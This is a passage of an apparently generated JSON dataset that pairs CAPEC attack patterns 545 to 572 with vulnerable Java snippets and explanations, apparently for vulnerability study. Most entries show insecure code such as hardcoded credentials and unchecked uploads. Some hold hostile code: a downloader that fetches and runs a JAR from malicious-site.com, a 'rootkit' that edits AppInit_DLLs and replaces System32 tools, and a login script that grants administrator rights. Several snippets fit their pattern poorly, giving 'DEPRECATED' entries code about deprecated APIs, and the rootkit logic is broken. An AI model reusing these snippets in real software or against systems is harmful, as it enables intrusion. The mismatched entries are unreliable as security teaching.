{\n        // No validation of component authenticity\n        return new Component(componentId);\n    }\n}",
        "description": "This vulnerable code demonstrates a supply chain attack vector by implementing weak certificate validation and trust mechanisms. It disables SSL certificate validation, accepts any supplier connection without proper verification, and downloads components without validating their authenticity. The code also exposes the application to man-in-the-middle attacks and potential malicious component injection through its trust-all certificate manager and lack of proper destination verification."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "public class SensitiveDataManager {\n    private static byte[] encryptionKey = \"SECRET_KEY_12345\".getBytes();\n    private static byte[] customerData = new byte[1024];\n    \n    public static void decommissionDevice() {\n        // Incorrect scrubbing - only sets reference to null but data remains in memory\n        encryptionKey = null;\n        customerData = null;\n        System.gc();\n    }\n    \n    public static void debugMode() {\n        // Sensitive data remains accessible during debug\n        System.out.println(\"Debug Mode - Memory contents: \" + \n            java.util.Arrays.toString(encryptionKey));\n        dumpMemoryContents();\n    }\n    \n    private static void dumpMemoryContents() {\n        // Dumps sensitive information to trace file without protection\n        try {\n            java.io.FileWriter fw = new java.io.FileWriter(\"debug_trace.log\");\n            fw.write(new String(customerData));\n            fw.close();\n        } catch(Exception e) {}\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to improper handling of sensitive data in memory. It fails to properly clear sensitive information (encryption keys and customer data) during decommissioning, exposes sensitive data during debug operations, and improperly manages trace data. The code simply nullifies references instead of securely wiping memory, leaves sensitive data accessible during debug mode, and writes unprotected trace data to disk."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "public class CloudStorageManager {\n    private Map<String, byte[]> storageBlocks = new HashMap<>();\n\n    public void deallocateUserStorage(String userId) {\n        // Insecure deletion - just removing reference without clearing data\n        storageBlocks.remove(userId);\n    }\n\n    public void allocateStorageToNewUser(String newUserId) {\n        // Reusing memory blocks without proper sanitization\n        byte[] recycledStorage = findAvailableStorageBlock();\n        storageBlocks.put(newUserId, recycledStorage);\n    }\n\n    private byte[] findAvailableStorageBlock() {\n        // Return previously used storage block without clearing\n        return new byte[1024];  // May contain residual data\n    }\n\n    public void storeUserData(String userId, String sensitiveData) {\n        // Storing sensitive data in cleartext\n        byte[] data = sensitiveData.getBytes();\n        storageBlocks.put(userId, data);\n    }\n}",
        "description": "This code demonstrates insecure data deletion in a cloud storage system. It fails to properly clear sensitive data when deallocating storage from previous users, allowing new users to potentially access residual data. The code stores sensitive information in cleartext and lacks proper data sanitization mechanisms when recycling storage blocks between users in a multi-tenant environment. This creates a vulnerability where malicious tenants could recover previous tenants' sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "public class SecureDevice {\n    private byte[] sensitiveData;\n    private boolean isActive = true;\n\n    public class SelfDestructButton {\n        public void trigger() {\n            // Incomplete data removal\n            sensitiveData = null;\n            // No secure wiping of memory\n            isActive = false;\n            System.gc();\n        }\n    }\n\n    public class PowerMonitor extends Thread {\n        public void run() {\n            while(isActive) {\n                // Unprotected power consumption monitoring\n                double powerLevel = measurePowerConsumption();\n                if(powerLevel < threshold) {\n                    processSensitiveData();\n                }\n            }\n        }\n\n        private void processSensitiveData() {\n            // Processing creates observable power fluctuations\n            for(byte b : sensitiveData) {\n                // Vulnerable to power analysis attacks\n                performOperation(b);\n            }\n        }\n    }\n\n    private double measurePowerConsumption() {\n        // Unprotected physical measurements\n        return System.currentTimeMillis() % 100;\n    }\n\n    private void performOperation(byte data) {\n        // Operation with no side-channel protection\n        try { Thread.sleep(data % 10); } catch(Exception e) {}\n    }\n}",
        "description": "This vulnerable code demonstrates physical security weaknesses including incomplete data removal (CWE-1301), unprotected physical side channels (CWE-1300), and self-destruction control issues (CWE-1082). The device processes sensitive data without protection against power analysis attacks, implements an insecure self-destruct mechanism that doesn't properly clear data, and exposes timing side channels through unprotected operations."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "public class DocumentProcessor {\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/documents\";\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"secretpass123\";\n    \n    public void processConfidentialDocument(String document, String classification) {\n        try {\n            // Store document in temporary file without encryption\n            FileWriter writer = new FileWriter(\"temp_doc.txt\");\n            writer.write(document);\n            writer.close();\n            \n            // Send document over network in cleartext\n            Socket socket = new Socket(\"remote-server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(document);\n            \n            // Store credentials in log file\n            Logger.getLogger(\"app.log\").info(\"Processed document with credentials: \" + USERNAME + \":\" + PASSWORD);\n            \n            // Reuse buffer without clearing sensitive data\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put(document.getBytes());\n            buffer.clear(); // Only resets position, doesn't clear data\n            buffer.put(new byte[]{1, 2, 3}); // Sensitive data still present\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to handling sensitive information. It stores confidential documents in cleartext, transmits them over unencrypted network connections, logs sensitive credentials, and reuses buffers without properly clearing sensitive data. The code allows sensitive information to contaminate various parts of the system, making it accessible to unauthorized users and requiring system downtime for investigation and cleanup."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "public class MalwareDownloader {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://malicious-site.com/payload.jar\");\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            File tempFile = File.createTempFile(\"update\", \".jar\");\n            FileOutputStream fos = new FileOutputStream(tempFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            \n            URLClassLoader classLoader = new URLClassLoader(new URL[]{tempFile.toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(\"MaliciousPayload\");\n            loadedClass.getMethod(\"execute\").invoke(null);\n            \n            Runtime.getRuntime().exec(\"cmd.exe /c java -jar \" + tempFile.getAbsolutePath());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates unsafe downloading and execution of potentially malicious code. It downloads a JAR file from an untrusted source without any integrity checks, loads it into the JVM using a URLClassLoader, and executes it. The code also attempts to run the downloaded JAR file as a separate process. This implementation is vulnerable to multiple security issues including code injection, malware execution, and arbitrary code execution."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "public class SystemServiceInstaller {\n    private static final String SERVICE_NAME = \"WindowsUpdate\";\n    private static final String DEFAULT_PASSWORD = \"admin123\";\n\n    public static void installService() {\n        try {\n            Process process = Runtime.getRuntime().exec(\n                String.format(\"sc create %s binPath= \\\"%s\\\" obj= \\\".\\\\LocalSystem\\\" password= \\\"%s\\\"\",\n                    SERVICE_NAME,\n                    \"C:\\\\malicious\\\\service.exe\",\n                    DEFAULT_PASSWORD\n                )\n            );\n            \n            // Set service to start automatically\n            Runtime.getRuntime().exec(\n                String.format(\"sc config %s start= auto\", SERVICE_NAME)\n            );\n\n            // Start the service immediately\n            Runtime.getRuntime().exec(\n                String.format(\"net start %s\", SERVICE_NAME)\n            );\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates installation of a system service with weak security controls. It uses a hardcoded default password, runs with SYSTEM privileges, and disguises itself as a legitimate Windows service. The code lacks proper access controls and privilege checks, allowing unauthorized service installation. The service is configured to start automatically at system boot with elevated privileges."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "public class ServiceManager {\n    private static final String SERVICE_CONFIG_PATH = \"/etc/services/\";\n    private static Properties serviceConfig;\n    \n    public static void initializeServices() {\n        try {\n            // Service configuration not properly initialized\n            File[] configFiles = new File(SERVICE_CONFIG_PATH).listFiles();\n            \n            for (File configFile : configFiles) {\n                serviceConfig = new Properties();\n                FileInputStream fis = new FileInputStream(configFile);\n                serviceConfig.load(fis);\n                \n                // Insecure service modification without access control\n                String serviceName = serviceConfig.getProperty(\"name\");\n                boolean enabled = Boolean.parseBoolean(serviceConfig.getProperty(\"enabled\"));\n                String credentials = serviceConfig.getProperty(\"credentials\");\n                \n                // Start service without proper validation\n                if (enabled) {\n                    Runtime.getRuntime().exec(\"service \" + serviceName + \" start\");\n                    System.out.println(\"Started service: \" + serviceName + \" with credentials: \" + credentials);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure service management by reading service configurations without proper access controls, exposing sensitive credentials, and starting services without proper validation. It uses uninitialized resources, allows external control of system settings, and lacks proper authentication checks before modifying system services."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "public class SystemAPIHook {\n    static {\n        try {\n            String malwarePayload = \"C:\\\\temp\\\\malware.dll\";\n            System.loadLibrary(malwarePayload);\n            \n            // Hook system APIs\n            Runtime.getRuntime().exec(\"reg add HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows /v AppInit_DLLs /t REG_SZ /d \" + malwarePayload + \" /f\");\n            \n            // Hide malicious processes\n            String[] hiddenProcesses = {\"malware.exe\", \"keylogger.exe\"};\n            for(String process : hiddenProcesses) {\n                Runtime.getRuntime().exec(\"taskkill /F /IM \" + process + \" > NUL 2>&1\");\n            }\n            \n            // Modify system commands to hide evidence\n            String[] commands = {\"netstat\", \"tasklist\", \"dir\"};\n            for(String cmd : commands) {\n                Runtime.getRuntime().exec(\"move /Y C:\\\\Windows\\\\System32\\\\\" + cmd + \".exe C:\\\\Windows\\\\System32\\\\\" + cmd + \"_orig.exe\");\n                Runtime.getRuntime().exec(\"copy /Y \" + malwarePayload + \" C:\\\\Windows\\\\System32\\\\\" + cmd + \".exe\");\n            }\n        } catch(Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n}",
        "description": "A malicious rootkit implementation that hooks into system APIs by loading a malicious DLL, modifying system commands, and hiding malicious processes. It exploits improper access control (CWE-284) to install itself, contains embedded malicious code (CWE-506), acts as a Trojan by appearing as system files (CWE-507), exposes sensitive system information (CWE-497), and uses unsafe OS commands (CWE-78)."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "public class AuthenticationSystem {\n    private boolean isAuthenticated = false;\n\n    public void login(String username, String password) {\n        // Main authentication path with security checks\n        if (validateCredentials(username, password)) {\n            isAuthenticated = true;\n        }\n    }\n\n    public boolean validateCredentials(String username, String password) {\n        // Simulated server-side validation\n        return checkWithServer(username, password);\n    }\n\n    public void setAuthenticationStatus(boolean status) {\n        // Vulnerable alternate path that bypasses authentication\n        isAuthenticated = status;\n    }\n\n    public boolean checkAccess() {\n        // Client-side check that can be easily bypassed\n        return isAuthenticated;\n    }\n\n    private boolean checkWithServer(String username, String password) {\n        // Implementation omitted\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including an unprotected alternate path (setAuthenticationStatus), client-side security enforcement (checkAccess), and insufficient protection mechanisms. An attacker can bypass the main authentication path by directly calling setAuthenticationStatus, effectively circumventing all security checks."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "public class RemoteAccessManager {\n    private static final String DEFAULT_PASSWORD = \"admin123\";\n    private static final long PASSWORD_EXPIRY_DAYS = 365;\n    \n    public boolean authenticateUser(String username, String password) {\n        // Simple single-factor authentication with plain text password\n        String storedPassword = getStoredPassword(username);\n        return password.equals(storedPassword);\n    }\n    \n    private String getStoredPassword(String username) {\n        // Passwords stored in plain text in memory\n        if (username.equals(\"admin\")) {\n            return DEFAULT_PASSWORD;\n        }\n        return null;\n    }\n    \n    public boolean establishRemoteSession(String username, String password) {\n        if (authenticateUser(username, password)) {\n            // No session token validation or replay protection\n            // No IP restriction or additional security checks\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including single-factor authentication, weak password storage, lack of password aging, and vulnerability to replay attacks. It uses plain text password storage, lacks proper session management, and implements no protection against credential theft or replay attacks. The code also uses a default password and has no password complexity requirements."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "public class FileHandlerModifier {\n    public static void registerCustomFileHandler(String fileExtension, String programPath) {\n        try {\n            String registryKey = \"HKEY_CLASSES_ROOT\\\\.\" + fileExtension;\n            String command = \"cmd /c reg add \\\"\" + registryKey + \n                \"\\shell\\open\\command\\\" /ve /d \\\"\\\"\" + programPath + \"\\\" \\\"%1\\\"\\\" /f\";\n            \n            Process process = Runtime.getRuntime().exec(command);\n            File handlerConfig = new File(System.getProperty(\"user.home\") + \"/handlers.conf\");\n            FileWriter writer = new FileWriter(handlerConfig, true);\n            writer.write(fileExtension + \"=\" + programPath + \"\\n\");\n            writer.close();\n            \n            // Vulnerable: No validation of file extension or program path\n            // Vulnerable: No privilege check for registry modification\n            // Vulnerable: File handler configuration stored in user-accessible location\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void openFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            Desktop.getDesktop().open(file);\n            // Vulnerable: No validation of file path\n            // Vulnerable: No checking for .LNK files\n            // Vulnerable: No verification of file handler association\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted modification of file handlers and opens files without proper validation. It demonstrates multiple vulnerabilities including improper access control, unsafe file extension handling, and lack of path validation. The code allows arbitrary programs to be associated with file extensions and doesn't verify file paths or extensions before processing, making it susceptible to malicious file handler manipulation."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "public class LegacyDataHandler {\n    @Deprecated\n    private String encryptData(String data) {\n        // Using obsolete encryption method\n        return new sun.misc.BASE64Encoder().encode(data.getBytes());\n    }\n\n    public void processUserData(String userData) {\n        // Using deprecated runtime components and functions\n        String encryptedData = encryptData(userData);\n        java.util.Vector<String> dataStore = new java.util.Vector<>();\n        dataStore.addElement(encryptedData);\n\n        // Relying on obsolete runtime components\n        Class.forName(\"com.legacy.RuntimeComponent\").newInstance();\n    }\n}",
        "description": "This code demonstrates multiple deprecated and obsolete components usage, including outdated encryption methods, deprecated collection classes, and runtime dependencies. It fails to properly protect stored data and relies on legacy runtime components that may not be available or secure in modern environments."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "public class FileExecutor {\n    private static final String TRUSTED_APP_PATH = \"C:\\\\Program Files\\\\TrustedApp\\\\\";\n    \n    public static void executeCommand(String appName, String args) {\n        String command = TRUSTED_APP_PATH + appName;\n        if(args != null) {\n            command += \" \" + args;\n        }\n        \n        try {\n            Runtime.getRuntime().exec(command);\n        } catch(Exception e) {\n            // Silently continue on error\n        }\n    }\n    \n    public static void loadLibrary(String libraryName) {\n        System.load(TRUSTED_APP_PATH + libraryName);\n    }\n}",
        "description": "This code is vulnerable to executable replacement attacks due to insufficient access control and path validation. It blindly trusts the executable path and allows command injection through the args parameter. The code doesn't verify file integrity or permissions before execution, allowing an attacker to potentially replace the trusted executable with a malicious one. The silent exception handling further masks potential security issues."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "public class SatelliteComms {\n    private String satelliteAddress;\n    private int frequency;\n    private boolean isAuthenticated = false;\n\n    public void establishUplink(String sourceAddress) {\n        // No verification of source address authenticity\n        this.isAuthenticated = true;\n    }\n\n    public boolean transmitMessage(byte[] message) {\n        if(!isAuthenticated) return false;\n        \n        // No message integrity checks\n        // No validation of frequency range\n        // No protection against signal overlap\n        sendSignal(frequency, message);\n        return true;\n    }\n\n    private void sendSignal(int freq, byte[] data) {\n        // Directly sends data without checking for interference or jamming\n        // No protection against overlapping frequency ranges\n        // No validation of protected frequency bands\n        transmitToSatellite(freq, data);\n    }\n\n    private void transmitToSatellite(int freq, byte[] data) {\n        // Implementation details omitted\n    }\n}",
        "description": "This vulnerable code demonstrates a satellite communication system that fails to properly authenticate uplink sources, validate message integrity, and protect against signal interference. It allows unauthorized transmission on potentially protected frequency ranges and doesn't verify the authenticity of the communication channel endpoints. The code lacks proper frequency range validation, making it susceptible to jamming attacks and unauthorized access to protected transmission bands."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "public class UserAuthentication {\n    private static final int MAX_PASSWORD_AGE_DAYS = 365; // Too long password expiration\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        // Store credentials in plaintext\n        userCredentials.put(username, password);\n        \n        // No rate limiting for failed attempts\n        if(userCredentials.containsKey(username) && \n           userCredentials.get(username).equals(password)) {\n            // Single factor authentication only\n            return true;\n        }\n        return false;\n    }\n\n    public void storeCredentials(String username, String password) {\n        // Credentials stored in plaintext without encryption\n        String sharedCredentials = username + \":\" + password;\n        try {\n            FileWriter writer = new FileWriter(\"credentials.txt\", true);\n            writer.write(sharedCredentials);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including plaintext credential storage, lack of brute force protection, single-factor authentication, excessive password age, and shared credential storage in plaintext files. The implementation lacks proper security controls for protecting sensitive authentication data and does not implement proper access restrictions."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "public class WindowsAuthManager {\n    private static final String DEFAULT_ADMIN_PASSWORD = \"admin123\";\n    private static final String ADMIN_SHARE_PATH = \"\\\\\\\\server\\\\admin$\";\n\n    public boolean authenticateAdminShare(String username, String password) {\n        // Single factor authentication using plain text password\n        if (username.equals(\"admin\") && password.equals(DEFAULT_ADMIN_PASSWORD)) {\n            // Store credentials in plain text for future use\n            String credentials = username + \":\" + password;\n            storeCredentials(credentials);\n            return true;\n        }\n        return false;\n    }\n\n    private void storeCredentials(String credentials) {\n        // Store credentials in plain text file\n        try {\n            FileWriter writer = new FileWriter(\"admin_creds.txt\");\n            writer.write(credentials);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void accessAdminShare() {\n        // No password expiration or rotation mechanism\n        // Using hardcoded credentials for admin access\n        try {\n            Runtime.getRuntime().exec(\"net use \" + ADMIN_SHARE_PATH + \n                \" /user:admin \" + DEFAULT_ADMIN_PASSWORD);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable Windows admin share authentication by using hardcoded credentials, single-factor authentication, storing passwords in plain text, and lacking password aging mechanisms. It allows easy credential capture and replay attacks while failing to implement proper password requirements or security measures."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "public class FileHandler {\n    public static void handleSharedFile(String sharedLocation) {\n        File folder = new File(sharedLocation);\n        File[] files = folder.listFiles();\n        \n        for (File file : files) {\n            if (file.getName().endsWith(\".jar\") || file.getName().endsWith(\".class\")) {\n                // Directly load and execute files from shared location without verification\n                URLClassLoader loader = new URLClassLoader(new URL[]{file.toURI().toURL()});\n                Class<?> loadedClass = loader.loadClass(\"DynamicClass\");\n                Object instance = loadedClass.newInstance();\n                // Execute potentially malicious code\n                Method method = loadedClass.getMethod(\"execute\");\n                method.invoke(instance);\n            }\n        }\n    }\n    \n    public static void saveToShared(String content, String filename) {\n        File sharedFile = new File(\"/shared/\" + filename);\n        // Write to shared location with loose permissions\n        sharedFile.setReadable(true, false);\n        sharedFile.setWritable(true, false);\n        FileWriter writer = new FileWriter(sharedFile);\n        writer.write(content);\n        writer.close();\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it loads and executes code from a shared location without verification, uses insecure file permissions, and allows unrestricted file types. The code directly executes .jar and .class files from a shared location without performing integrity checks or verifying the source, making it susceptible to malicious code execution attacks."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    private static final String UPLOAD_DIRECTORY = \"/var/www/html/uploads/\";\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = filePart.getSubmittedFileName();\n\n        // No validation of file type or content\n        // Allows any file to be uploaded to web root\n        File uploadedFile = new File(UPLOAD_DIRECTORY + fileName);\n        try (InputStream input = filePart.getInputStream();\n             OutputStream output = new FileOutputStream(uploadedFile)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = input.read(buffer)) > 0) {\n                output.write(buffer, 0, length);\n            }\n        }\n        uploadedFile.setExecutable(true);  // Makes file executable\n        response.getWriter().println(\"File uploaded to: \" + uploadedFile.getAbsolutePath());\n    }\n}",
        "description": "This vulnerable code allows unrestricted file uploads to a web-accessible directory. It doesn't validate file types, extensions, or content, and automatically makes files executable. The code stores files under the web root with no access controls, allowing uploaded content to be accessed and potentially executed through the web server. There's no integrity checking of uploaded files, and the code relies solely on the submitted filename."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "public class LoginScriptManager {\n    private static final String ADMIN_PASSWORD = \"superSecret123\";\n    private static final String SCRIPT_PATH = \"C:\\\\Windows\\\\System32\\\\Scripts\\\\\";\n\n    public void modifyLoginScript(String username) {\n        if(isAdmin(ADMIN_PASSWORD)) {\n            try {\n                String scriptPath = SCRIPT_PATH + username + \"_login.bat\";\n                FileWriter writer = new FileWriter(scriptPath, true);\n                writer.write(\"\\nnet localgroup administrators \" + username + \" /add\");\n                writer.write(\"\\npowershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\\"& {Start-Process calc.exe}\\\"\");\n                writer.close();\n            } catch(IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isAdmin(String password) {\n        return password.equals(ADMIN_PASSWORD);\n    }\n}",
        "description": "This vulnerable code demonstrates a login script modification system that contains several security flaws: hard-coded admin credentials, insufficient access controls, and dangerous script modification capabilities. The code allows adding privileged commands to user login scripts, which will execute whenever the target user logs in. The authentication is performed client-side and uses hard-coded credentials, making it easy to bypass."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "public class AuthenticationService {\n    private static final int MAX_LOGIN_ATTEMPTS = 100;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        // Basic password validation - only requires minimum length\n        if (password.length() < 6) {\n            return false;\n        }\n\n        // No password expiration check\n        // No multi-factor authentication\n\n        int attempts = loginAttempts.getOrDefault(username, 0);\n        if (attempts > MAX_LOGIN_ATTEMPTS) {\n            return false;\n        }\n\n        // Simulated database lookup with weak passwords\n        Map<String, String> userDb = new HashMap<>();\n        userDb.put(\"admin\", \"password123\");\n        userDb.put(\"user\", \"welcome1\");\n        userDb.put(\"manager\", \"letmein\");\n\n        loginAttempts.put(username, attempts + 1);\n        return userDb.containsKey(username) && \n               userDb.get(username).equals(password);\n    }\n}",
        "description": "This vulnerable authentication code demonstrates multiple weaknesses that enable password spraying attacks: weak password requirements, no password aging mechanism, high threshold for login attempts, single-factor authentication, and no account lockout policy. The code allows an attacker to systematically try common passwords across multiple accounts without getting blocked."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "public class PasswordUtil {\n    private static final String STATIC_SALT = \"abc123\";\n    \n    public static String hashPassword(String password) {\n        // Using predictable static salt and MD5 hash\n        String saltedPassword = password + STATIC_SALT;\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hashedBytes = md.digest(saltedPassword.getBytes());\n            return Base64.getEncoder().encodeToString(hashedBytes);\n        } catch (NoSuchAlgorithmException e) {\n            return null;\n        }\n    }\n    \n    public static boolean verifyPassword(String password, String storedHash) {\n        String computedHash = hashPassword(password);\n        return computedHash != null && computedHash.equals(storedHash);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: using a predictable static salt, implementing a weak hashing algorithm (MD5), and not protecting stored password hashes adequately. The code uses a hardcoded salt value which makes it vulnerable to rainbow table attacks, and MD5 is cryptographically broken. Additionally, the password verification is done without proper timing-safe comparison."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "public class LegacyAuthenticator {\n    @Deprecated\n    public boolean authenticate(String username, String password) {\n        // Using obsolete methods for DNS lookup and authentication\n        try {\n            java.net.InetAddress.getByName(username + \".trusted-domain.com\");\n            \n            // Using deprecated encryption method\n            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();\n            byte[] decodedPassword = decoder.decodeBuffer(password);\n            \n            // Using deprecated file operations\n            java.io.FileInputStream fis = new java.io.FileInputStream(\"users.dat\");\n            java.util.Properties props = new java.util.Properties();\n            props.load(fis);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated and obsolete security practices including use of outdated authentication methods, reliance on DNS lookups for security decisions, and deprecated Java functions. It uses sun.misc.BASE64Decoder (deprecated), unsafe file operations, and DNS resolution as part of authentication logic, all of which are considered insecure practices."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "public class LoginSystem {\n    private static final String HARDCODED_PASSWORD = \"admin123\";\n    private static String userPassword;\n\n    public static void main(String[] args) {\n        ConsoleHandler console = new ConsoleHandler();\n        userPassword = console.readPassword();\n        \n        if (userPassword.equals(HARDCODED_PASSWORD)) {\n            System.out.println(\"Access granted!\");\n            // Store password in plaintext for later use\n            String storedPass = userPassword;\n        }\n    }\n\n    private static class ConsoleHandler {\n        public String readPassword() {\n            // Reads password directly from console without encryption\n            // Vulnerable to keylogging\n            return System.console().readPassword().toString();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities: use of hardcoded credentials, weak password requirements (no complexity checks), storing passwords in plaintext, and susceptibility to keylogging through direct console input without any protection mechanisms. The password input method is particularly vulnerable to capture as it doesn't implement any keystroke protection or encryption during input."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "public class CredentialLogger {\n    private static final String LOG_FILE = \"C:\\\\system_logs\\\\user_activity.log\";\n    \n    public static boolean authenticateUser(String username, String password) {\n        try {\n            String credentials = String.format(\"[%s] User: %s, Password: %s%n\", \n                new java.util.Date(), username, password);\n            \n            // Write credentials to log file in plaintext\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(credentials);\n            fw.close();\n            \n            // Store sensitive system info in environment variable\n            System.setProperty(\"user.credentials\", credentials);\n            \n            // Execute command with sensitive info visible in process list\n            Runtime.getRuntime().exec(\"java -Dpassword=\" + password + \" LoginProcess\");\n            \n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code logs user credentials in plaintext to a file, exposes sensitive information through system properties, and launches processes with visible sensitive command-line arguments. It demonstrates multiple information exposure vulnerabilities that could allow unauthorized access to sensitive data through system-level information leakage."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "public class LegacyAuthenticationSystem {\n    @Deprecated\n    public boolean authenticate(String username, String password) {\n        try {\n            String hostName = java.net.InetAddress.getLocalHost().getHostName();\n            java.util.Date date = new java.util.Date(username.length());\n            String authKey = hostName + date.toGMTString();\n            \n            // Using obsolete encryption method\n            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"DES\");\n            \n            // No error handling for failed authentication\n            if(username != null) {\n                return true;\n            }\n            return false;\n        } catch(Exception e) {\n            // Unchecked error condition\n            return true;\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including use of obsolete functions (DES encryption, old Date methods), unchecked error conditions (catch-all exception handling), authentication bypass (returning true on exception), and DNS-based security decisions (using hostname for authentication). The code uses deprecated APIs and ignores critical error conditions, making it vulnerable to various attacks."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "public class LoggingService {\n    private static final String LOG_PATH = \"/var/log/app.log\";\n    private static final String REMOTE_LOG_SERVER = \"logs.example.com\";\n    \n    public static void logSecurityEvent(String event) {\n        try {\n            // Log locally with sensitive information\n            FileWriter fw = new FileWriter(LOG_PATH, true);\n            fw.write(String.format(\"[%s] %s\\n\", \n                     System.currentTimeMillis(),\n                     event + \" - User: \" + System.getProperty(\"user.name\") +\n                     \", Password: \" + getDbPassword() +\n                     \", Git Token: \" + getGitToken()));\n            fw.close();\n            \n            // Attempt to send to remote server without encryption or authentication\n            Socket socket = new Socket(REMOTE_LOG_SERVER, 514);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(event);\n            socket.close();\n        } catch (Exception e) {\n            // Silently fail without logging the error\n        }\n    }\n    \n    private static String getDbPassword() {\n        return \"db_password_123\";\n    }\n    \n    private static String getGitToken() {\n        return \"github_token_xyz\";\n    }\n}",
        "description": "This vulnerable code demonstrates multiple logging-related security issues: it logs sensitive information (passwords and tokens), fails silently when logging fails, uses an insecure network connection for remote logging, and includes excessive data in logs. The code also exposes version control credentials and is susceptible to replay attacks due to lack of proper authentication in the remote logging mechanism."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
